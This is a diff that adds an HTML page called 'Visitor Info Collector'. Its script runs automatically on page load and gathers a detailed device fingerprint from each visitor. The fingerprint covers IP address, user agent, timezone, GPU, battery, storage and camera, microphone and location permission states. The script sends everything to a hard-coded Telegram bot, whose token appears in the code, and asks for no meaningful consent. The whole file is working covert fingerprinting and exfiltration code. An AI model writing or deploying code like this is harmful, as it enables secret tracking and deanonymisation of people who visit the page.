@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Visitor Info Collector</title>
+</head>
+<body>
+  <h2>Collecting your device info...</h2>
+  <script>
+    async function sendVisitorInfoToTelegram() {
+      try {
+        // Battery info
+        const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+
+        // Network info
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+
+        // Storage estimate
+        let storageEstimate = { quota: 'Not Available', usage: 'Not Available' };
+        if (navigator.storage && navigator.storage.estimate) {
+          const estimate = await navigator.storage.estimate();
+          storageEstimate.quota = (estimate.quota / (1024 * 1024)).toFixed(2) + " MB";
+          storageEstimate.usage = (estimate.usage / (1024 * 1024)).toFixed(2) + " MB";
+        }
+
+        // Permissions helper
+        async function getPermissionStatus(name) {
+          try {
+            if (!navigator.permissions) return 'Not Supported';
+            const status = await navigator.permissions.query({ name });
+            return status.state;
+          } catch {
+            return 'Not Available';
+          }
+        }
+
+        const cameraPerm = await getPermissionStatus('camera');
+        const micPerm = await getPermissionStatus('microphone');
+        const geoPerm = await getPermissionStatus('geolocation');
+        const notifPerm = await getPermissionStatus('notifications');
+
+        // GPU info
+        function getWebGLInfo() {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "WebGL not supported";
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+              const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+              const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+              return `${vendor} - ${renderer}`;
+            }
+            return "WebGL debug info not available";
+          } catch (e) {
+            return "Error getting WebGL info";
+          }
+        }
+
+        const gpuInfo = getWebGLInfo();
+
+        // IP Address via external API
+        let ip = 'Not Available';
+        try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          ip = ipData.ip;
+        } catch {}
+
+        // Prepare message
+        const message = `Visitor Info:
+IP: ${ip}
+User Agent: ${navigator.userAgent}
+Language: ${navigator.language}
+Languages: ${navigator.languages ? navigator.languages.join(', ') : 'Not Available'}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Screen Resolution: ${screen.width}x${screen.height}
+Viewport Size: ${window.innerWidth}x${window.innerHeight}
+Platform: ${navigator.platform}
+Battery Level: ${battery ? (battery.level * 100).toFixed(0) + '%' : 'Not Available'}
+Battery Charging: ${battery ? battery.charging : 'Not Available'}
+Cookies Enabled: ${navigator.cookieEnabled}
+Online Status: ${navigator.onLine}
+Do Not Track: ${navigator.doNotTrack || 'Not Available'}
+Device Memory (GB): ${navigator.deviceMemory || 'Not Available'}
+Connection Type: ${connection.effectiveType || 'Not Available'}
+Hardware Concurrency (CPU cores): ${navigator.hardwareConcurrency || 'Not Available'}
+GPU: ${gpuInfo}
+Storage Quota: ${storageEstimate.quota}
+Storage Usage: ${storageEstimate.usage}
+Permissions:
+  Camera: ${cameraPerm}
+  Microphone: ${micPerm}
+  Geolocation: ${geoPerm}
+  Notifications: ${notifPerm}
+Referrer: ${document.referrer || 'None'}
+`;
+
+        // Send to Telegram bot
+        const botToken = "7832448837:AAGOA4AFoNyBE4xaOWh9dLUY_VDNSJ20v8A";
+        const chatId = "1507918922";
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+
+        console.log('Visitor info sent successfully');
+      } catch (error) {
+        console.error('Error collecting or sending visitor info:', error);
+      }
+    }
+
+    // Run it
+    sendVisitorInfoToTelegram();
+  </script>
+</body>
+</html>
